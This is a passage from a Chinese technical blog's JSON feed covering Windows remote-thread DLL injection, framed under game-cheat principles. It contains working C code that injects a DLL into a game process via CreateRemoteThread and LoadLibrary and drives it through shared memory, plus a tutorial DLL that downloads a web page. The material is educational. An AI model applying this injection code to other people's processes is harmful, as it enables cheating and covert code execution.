punctuation\">(</span>hProcess<span class=\"token punctuation\">,</span> pBuf<span class=\"token punctuation\">,</span> DllPath<span class=\"token punctuation\">,</span> nLen<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>dwWrite<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"写入内存失败！\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token comment\">//4. 创建远程线程，让对方调用 LoadLibrary</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    HANDLE hRemoteThread <span class=\"token operator\">=</span> <span class=\"token function\">CreateRemoteThread</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        hProcess<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token punctuation\">(</span>LPTHREAD_START_ROUTINE<span class=\"token punctuation\">)</span>LoadLibrary<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        pBuf<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token comment\">//5. 等待线程结束返回，释放资源</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token function\">WaitForSingleObject</span><span class=\"token punctuation\">(</span>hRemoteThread<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hRemoteThread<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token function\">VirtualFreeEx</span><span class=\"token punctuation\">(</span>hProcess<span class=\"token punctuation\">,</span> pBuf<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> MEM_FREE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token comment\">// 创建 FileMapping</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>BOOL <span class=\"token function\">InitFileMapping</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    <span class=\"token comment\">// 挂载共享内存</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    HANDLE g_hMapFile <span class=\"token operator\">=</span> <span class=\"token function\">CreateFileMapping</span><span class=\"token punctuation\">(</span>INVALID_HANDLE_VALUE<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> PAGE_READWRITE<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">,</span> _MAP_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>g_hMapFile <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"CreateFileMapping Error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        <span class=\"token keyword\">return</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    lpBuff <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>LPTSTR<span class=\"token punctuation\">)</span><span class=\"token function\">MapViewOfFile</span><span class=\"token punctuation\">(</span>g_hMapFile<span class=\"token punctuation\">,</span> FILE_MAP_ALL_ACCESS<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> BUFSIZ<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>lpBuff <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"MapViewOfFile Error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>        <span class=\"token keyword\">return</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    <span class=\"token keyword\">return</span> TRUE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    LPCWSTR  DllPath <span class=\"token operator\">=</span> L<span class=\"token string\">\"F:\\\\000Users\\\\Desktop\\\\Dll2021-7-20.dll\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>    <span class=\"token function\">InitFileMapping</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    <span class=\"token function\">RemoteThreadInject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>LPTSTR<span class=\"token punctuation\">)</span><span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LittleGame.exe\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>DllPath<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    DWORD dwOrderList<span class=\"token punctuation\">[</span><span class=\"token number\">255</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token comment\">// 命令队列</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    dwOrderList<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    dwOrderList<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>    dwOrderList<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>    dwOrderList<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>    dwOrderList<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>    dwOrderList<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>    dwOrderList<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>    dwOrderList<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>    dwOrderList<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>    dwOrderList<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>    dwOrderList<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>    DWORD dwCtrlCode <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>        dwCtrlCode <span class=\"token operator\">=</span> dwOrderList<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>        <span class=\"token function\">CopyMemory</span><span class=\"token punctuation\">(</span>lpBuff<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>dwCtrlCode<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pause\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>成功！</p>\n<p>这里不得不吐槽，就这些代码我看了一天多，昨晚还整到一点，全程调试，就是不知道为什么 dll 不执行。</p>\n<p>我这里之所以执行成功是因为在 <code>dwCtrlCode</code>  这里下了断点，我想看看一看传递的参数是否赋值成功。<br />\n结果，我 F11 一步一步执行，发现我看了一天多怎么都执行不了的代码可以执行了……</p>\n<p>可如果我不在 <code>dwCtrlCode</code>  这里下断点，直接执行，就弹出一个 dll 注入成功的窗，可程序还是没反应。</p>\n<p>不知道为什么。</p>\n<p><img data-src=\"001.gif\" alt=\"\" /></p>\n",
            "tags": [
                "Win32",
                "外挂原理",
                "DLL注入之进程间通信"
            ]
        },
        {
            "id": "https://self-ferry.github.io/Win%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/",
            "url": "https://self-ferry.github.io/Win%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/",
            "title": "Win远程线程注入",
            "date_published": "2021-07-19T07:56:02.000Z",
            "content_html": "<h1 id=\"1-什么是注入\"><a class=\"anchor\" href=\"#1-什么是注入\">#</a> 1、什么是注入？</h1>\n<p>所谓注入就是在第三方进程不知道或者不允许的情况下将模块或者代码写入对方进程空间，并设法执行的技术。</p>\n<p>在安全领域，“注入” 是非常重要的一一种技术手段，注入与反注入也一直处于不断变化的，而且也愈来愈激烈的对抗当中。</p>\n<p>己知的注入方式:<br />\n 远程线程注入、APC 注入、消息钩子注入、注册表注入、导入表注入、输入法注入等等。</p>\n<h1 id=\"2-远程线程注入的实现\"><a class=\"anchor\" href=\"#2-远程线程注入的实现\">#</a> 2、远程线程注入的实现</h1>\n<h2 id=\"楔子\"><a class=\"anchor\" href=\"#楔子\">#</a> 楔子</h2>\n<p>利用  <code>CreateRemoteThread</code>  函数我们能创建一个远程线程，并且在这个远程线程中运行一个满足  <code>ThreadProc</code>  格式的线程函数。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//ThreadProc 函数格式</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>DWORD WINAPI <span class=\"token function\">ThreadProc</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  __in  LPVOID lpParameter</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这个远程线程函数的格式是有局限的，有 4 个字节类型的返回值、一个参数。且必须在被创建远程线程的程序进程中，还要知道这个函数在这个程序进程中的地址。</p>\n<p>这就引出了我们的关键函数  <code>LoadLibary</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HMODULE WINAPI <span class=\"token function\">LoadLibrary</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  __in  LPCTSTR lpFileName</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>看下这张图立马就明白了</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>既让远程线程执行  <code>LoadLibrary</code>  函数去加载一个 dll（模块）。</p>\n<p>这也就是所谓的 DLL 注入。</p>\n<p>还有一个很重要的问题，我们知道不同进程中，地址空间是隔离的，那么我在注入的进程中传入 LoadLibrary 函数的地址，这算是一个硬编码的地址，它在目标进程中是否是一样的呢？答案是，二者的地址是一样的，这是由于 kernel32.dll 在 32 位程序中加载的基地址是一样的，而 LoadLibrary 在 kernel32.dll 中的偏移是一定的（只要不同的进程加载的是同一份 kernel32.dll）那么不同进程中的 LoadLibrary 函数的地址是一样的。其实不光是 LoadLibrary 函数，只要是 kernel32.dll 中导出的函数，在不同进程中的地址都是一样的。注意这里只是 32 位，如果想要使用 32 位程序往 64 位目标程序中注入，可能需要考虑地址转换的问题，只要知道 kernel32.dll 在 64 位中的偏移，就可以计算出对应函数的地址了。</p>\n<h2 id=\"dll注入\"><a class=\"anchor\" href=\"#dll注入\">#</a> DLL 注入</h2>\n<p>这是网上收集的一些概念。</p>\n<ol>\n<li>dll 注入是指向运行中的其它进程强制插入特定的 dll 文件。从技术细节来说，DLL 注入命令其他进程自行调用 LoadLibrary () API，加载用户指定的 dll 文件。</li>\n<li>当 dll 被加载到进程中以后，就拥有了访问进程内存的权限。(用户可以通过这个来修复程序 bug 或增加功能等)。</li>\n<li>dll 被加载到进程后会自动运行 DllMain 函数。</li>\n<li>使用 LoadLibrary () API 加载某个 DLL 时，该 DLL 中的 DllMain 函数就会被自动执行。DLL 注入的工作原理就是从外部促使目标进程调用 LoadLibrary () API，所以会强制掉用执行 DLL 的 DllMain () 函数。</li>\n</ol>\n<h1 id=\"实例\"><a class=\"anchor\" href=\"#实例\">#</a> 实例</h1>\n<h2 id=\"将会使用到的函数\"><a class=\"anchor\" href=\"#将会使用到的函数\">#</a> 将会使用到的函数</h2>\n<h3 id=\"getmodulefilename\"><a class=\"anchor\" href=\"#getmodulefilename\">#</a> <strong>GetModuleFileName</strong></h3>\n<p>获取当前进程已加载模块的文件的完整路径，该模块必须由当前进程加载。</p>\n<p>如果想要获取另一个已加载模块的文件路径，可以使用 GetModuleFileNameEx 函数。</p>\n<p>函数原型：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>DWORD WINAPI <span class=\"token function\">GetModuleFileName</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    _In_opt_  HMODULE hModule<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    _Out_     LPTSTR lpFilename<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    _In_      DWORD nSize</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li><em>hModule</em>： 一个模块的句柄。可以是一个 DLL 模块，或者是一个应用程序的实例句柄。如果该参数为 NULL，该函数返回该应用程序全路径。</li>\n<li><em>lpFileName</em>: 指定一个字符串缓冲区，要在其中容纳文件的用 NULL 字符中止的路径名，hModule 模块就是从这个文件装载进来的。</li>\n<li><em>nSize</em>： 装载到缓冲区 lpFileName 的最大字符数。</li>\n</ul>\n<p>返回值：</p>\n<p>如果返回为成功，将在 lpFileName 的<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclQkMlOTMlRTUlODYlQjIlRTUlOEMlQkE=\">缓冲区</span>当中返回相应模块的路径，如果所设的 nSize 过小，那么返回仅按所设置缓冲区大小返回相应字符串内容。如果函数失败，返回值将为 0，利用 GetLastError 可获得异常代码。</p>\n<h3 id=\"_tcsrchr\"><a class=\"anchor\" href=\"#_tcsrchr\">#</a> <strong>_tcsrchr</strong></h3>\n<p><strong>函数功能</strong> ：查找一个字符串中<strong>最后</strong>一次出现的指定字符。</p>\n<p><strong>函数原型</strong> ：<br />\nchar *strrchr( const char *string, int c);<br />\nchar *wcsrchr( const wchar_t *string, int c );<br />\n<strong> 参数说明</strong> ：<br />\n第一个参数：字符串<br />\n第二个参数：需要查找的字符<br />\n<strong>功能</strong> ：查找一个字符串中最后出现的指定字符。<br />\n<strong>返回值</strong> ：找出字符串中最后一个出现查找字符的地址，然后将该字符出现的地址返回。</p>\n<p>(注：_tcsrchr 支持 ANSI 和 UNICODE，ANSI 使用 strrchr，UNICODE 使用 wcsrchr。)</p>\n<h3 id=\"_tcscpy_s\"><a class=\"anchor\" href=\"#_tcscpy_s\">#</a> <strong>_tcscpy_s</strong></h3>\n<p>字符拷贝函数，使用的如果是 UNICODE 编码，则采用 wcscpy_s () 函数，如果是多字节编码，则采用 strcpy_s () 函数。</p>\n<p>功能：字符串拷贝</p>\n<p>后缀_s 表示使用安全的字符串拷贝函数，防止缓冲区不够大而引起错误。</p>\n<h3 id=\"urldownloadtofile\"><a class=\"anchor\" href=\"#urldownloadtofile\">#</a> <strong>URLDownloadToFile</strong></h3>\n<p>URLDownloadToFile，指从指定 URL 地址读取内容并将读取到的内容保存到特定的文件里的实现方法。</p>\n<p>函数原型：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HRESULT <span class=\"token function\">URLDownloadToFile</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    LPUNKNOWN pCaller<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    LPCTSTR szURL<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    LPCTSTR szFileName<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    DWORD dwReserved<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    LPBINDSTATUSCALLBACK lpfnCB</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>参数</p>\n<ul>\n<li><em>pCaller</em><br />\n 指向调用 ActiveX 组件的控制<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9tczY4MDUwOQ==\"> IUnknown</span> 接口的指针，如果调用者是 ActiveX 组件。如果调用应用程序不是 ActiveX 组件，则可以将此值设置为 <strong>NULL</strong> 。否则，调用方是包含在另一个组件中的 COM 对象，例如 HTML 页面上下文中的 ActiveX 控件。此参数表示调用组件的最外层 IUnknown。该函数在 ActiveX 客户端框架的上下文中尝试下载，并允许调用者容器接收有关下载进度的回调。</li>\n<li><em>szURL</em><br />\n 指向包含要下载的 URL 的字符串值的指针。不能设置为 <strong>NULL</strong> 。如果 URL 无效，则返回 INET_E_DOWNLOAD_FAILURE。</li>\n<li><em>szFileName</em><br />\n 指向包含要为下载创建的文件的名称或完整路径的字符串值的指针。如果<em> szFileName</em> 包含路径，则目标目录必须已经存在。</li>\n<li><em>dwReserved</em><br />\n 保留。必须设置为 0。</li>\n<li><em>lpfnCB</em><br />\n 指向调用者<a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775060(v=vs.85)\"><strong> IBindStatusCallback</strong></a> 接口的指针。通过使用<a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775064(v=vs.85)\"><strong> IBindStatusCallback::OnProgress</strong></a>，调用者可以接收下载状态。<a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)\"><strong>URLDownloadToFile</strong></a> 在接收到数据时调用<strong> IBindStatusCallback::OnProgress</strong> 和<a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775061(v=vs.85)\"><strong> IBindStatusCallback::OnDataAvailable</strong></a> 方法。下载操作可以通过从任何回调返回 E_ABORT 来取消。如果不需要状态，可以将此参数设置为 <strong>NULL</strong> 。</li>\n</ul>\n<p>返回值</p>\n<p>此函数可以返回这些值之一。</p>\n<table>\n<thead>\n<tr>\n<th>返回码</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>S_OK</strong></td>\n<td>下载成功开始。</td>\n</tr>\n<tr>\n<td><strong>E_OUTOFMEMORY</strong></td>\n<td>缓冲区长度无效，或内存不足，无法完成操作。</td>\n</tr>\n<tr>\n<td><strong>INET_E_DOWNLOAD_FAILURE</strong></td>\n<td>指定的资源或回调接口无效。</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"程序\"><a class=\"anchor\" href=\"#程序\">#</a> 程序</h2>\n<p>DLL 文件，环境是 VS2019。<br />\n只是简单的弹个窗，在并把百度首页保存到 dll 所在目录。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//dllmain.cpp : 定义 DLL 应用程序的入口点。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"pch.h\"</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;urlmon.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;tchar.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">pragma</span> <span class=\"token expression\"><span class=\"token function\">comment</span><span class=\"token punctuation\">(</span>lib<span class=\"token punctuation\">,</span> </span><span class=\"token string\">\"urlmon.lib\"</span><span class=\"token expression\"><span class=\"token punctuation\">)</span>  </span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DEF_FILE_NAME</span> <span class=\"token expression\"><span class=\"token punctuation\">(</span>L</span><span class=\"token string\">\"DllInject.html\"</span><span class=\"token expression\"><span class=\"token punctuation\">)</span> </span><span class=\"token comment\">//define 我们保存的网页的文件名</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// 自动下载到 dll 所在的目录下</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>DWORD WINAPI <span class=\"token function\">ThreadProc</span><span class=\"token punctuation\">(</span>LPVOID lpParameter<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    HMODULE g_hMod <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    TCHAR szPath<span class=\"token punctuation\">[</span>_MAX_PATH<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 定义一个数组来储存路径</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">GetModuleFileName</span><span class=\"token punctuation\">(</span>g_hMod<span class=\"token punctuation\">,</span> szPath<span class=\"token punctuation\">,</span> MAX_PATH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取当前模块的路径</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    TCHAR<span class=\"token operator\">*</span> p <span class=\"token operator\">=</span> <span class=\"token function\">_tcsrchr</span><span class=\"token punctuation\">(</span>szPath<span class=\"token punctuation\">,</span> <span class=\"token string\">'\\\\'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>      <span class=\"token comment\">// 在 szPath 储存的路径中从右到左寻找字符 \\\\ 并返回字符串指针</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">_tcscpy_s</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> _MAX_PATH<span class=\"token punctuation\">,</span> DEF_FILE_NAME<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 生成文件保存的路径，将 DllInject.html 保存在 szPath 路径最后的 '\\' 字符之后</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">URLDownloadToFile</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> L<span class=\"token string\">\"https://www.baidu.com\"</span><span class=\"token punctuation\">,</span> szPath<span class=\"token punctuation\">,</span> 